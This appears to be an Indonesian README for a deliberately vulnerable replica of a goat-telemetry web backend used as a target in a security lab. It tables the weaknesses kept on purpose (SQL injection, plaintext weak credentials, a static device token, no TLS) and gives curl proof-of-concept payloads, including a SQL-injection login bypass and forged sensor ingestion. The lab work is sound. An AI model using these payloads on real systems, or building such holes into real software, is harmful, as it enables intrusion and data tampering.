# Replika Backend KABITA (Target Node)

KABITA mencatat **berat badan** dan **pakan** kambing per ekor per hari. Perangkat lapangan
(timbangan + pembaca RFID) mengirim satu catatan setiap kali kambing ditimbang/diberi pakan.
Replika ini meniru bagian backend-nya; tidak ada perangkat fisik dan tidak ada data nyata.

## Stack

| Lapisan | Teknologi |
|---|---|
| Aplikasi | Nuxt 4 (SSR) + Nitro `node-server`, Node.js 22 |
| Basis data | PostgreSQL 18 (database `kabita`, user `kabita`) |
| Proses | systemd `kabita.service` → port 80 |
| Log | `journalctl -u kabita`, `rsyslog` |

Kode: `app/kabita/`. Deploy ulang: `python scripts/docs/deploy_kabita.py`.

## Model data

| Tabel | Isi |
|---|---|
| `kandang` | 2 kandang (KDG-01, KDG-02) |
| `kambing` | 6 kambing, RFID `KMB-001`…`KMB-006` |
| `telemetri` | penimbangan: `kambing_id`, `berat_kg`, `pakan_kg`, `sumber`, `ts` |
| `devices` | 2 timbangan + token statis |
| `users` | operator dashboard (`admin`, `operator`) |

Data awal: 60 baris telemetri (10 hari × 6 kambing).

## Endpoint

| Method | Path | Keterangan |
|---|---|---|
| GET | `/` | dashboard: 4 kartu ringkasan + tabel berat/pakan terakhir |
| GET | `/login` | form login operator |
| POST | `/api/login` | `{username,password}` → cookie `kabita_user` |
| GET | `/api/kambing` | daftar kambing + penimbangan terakhir |
| GET | `/api/ringkasan` | angka kartu dashboard |
| GET | `/api/telemetri?kambing=1&limit=50` | riwayat telemetri per kambing |
| POST | `/api/telemetri?token=<token>` | ingest dari timbangan: `{rfid,berat_kg,pakan_kg}` |

Contoh ingest (dari Attacker Node, meniru perangkat sah):

```bash
curl -s -X POST "http://192.168.4.5/api/telemetri?token=KBT-DEV-01-7f3c9a" \
  -H 'Content-Type: application/json' \
  -d '{"rfid":"KMB-001","berat_kg":33.4,"pakan_kg":1.8}'
```

## Kelemahan yang sengaja dipertahankan

| # | Kelemahan | Letak | Skenario | Ditutup oleh |
|---|---|---|---|---|
| 1 | SQL injection (query dirangkai dari input) | `GET /api/telemetri`, `POST /api/login` | RT-03 | C-2 |
| 2 | Password plaintext + kredensial lemah `admin/admin123` | tabel `users` | RT-02, RT-03 | A-1, C-2 |
| 3 | Token device statis di query string, tanpa rotasi/rate limit | `POST /api/telemetri` | RT-03 | C-3 |
| 4 | Telemetri tanpa validasi rentang (berat/pakan liar diterima) | `telemetri.post.ts` | RT-03 | C-3 |
| 5 | Tanpa TLS | port 80 | RT-01, RT-05 | C-1 |
| 6 | SSH password auth | port 22 | RT-02 | A-2 |

Pembuktian bahwa kelemahan ini nyata (bukan asumsi) — jalankan di Target Node:

```bash
# 1+2: login bypass SQL injection
curl -s -X POST http://127.0.0.1/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin'\'' --","password":"x"}'
# -> {"ok":true,"user":{"username":"admin","role":"admin"}}

# 1: UNION/boolean injection pada parameter kambing
curl -s "http://127.0.0.1/api/telemetri?kambing=1%20OR%201=1&limit=3" | head -c 200

# 4: nilai tidak wajar diterima
curl -s -X POST "http://127.0.0.1/api/telemetri?token=KBT-DEV-01-7f3c9a" \
  -H 'Content-Type: application/json' -d '{"rfid":"KMB-001","berat_kg":999,"pakan_kg":99}'
```

## Reset data

```bash
python scripts/docs/deploy_kabita.py --db-only    # schema + seed ulang (data hilang)
```
